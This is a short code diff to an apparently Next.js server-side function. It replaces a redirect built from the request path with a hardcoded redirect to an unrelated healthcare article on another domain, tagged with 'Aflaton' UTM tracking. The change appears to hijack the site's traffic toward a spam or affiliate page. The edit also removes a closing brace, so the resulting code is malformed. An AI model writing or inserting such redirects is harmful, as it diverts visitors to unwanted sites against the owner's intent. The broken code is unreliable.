@@ -19,8 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://dramacoool.kim/graphql/` + encodeURI(path as string)
-				}`,
+					`https://p.spardhavijetha.in/highly-recommended-healthcare-facilities-in-chennai-for-emergency-care/?utm_source=Aflaton&utm_medium=Aflaton&utm_campaign=Aflaton/`
 			},
 		};
 		}
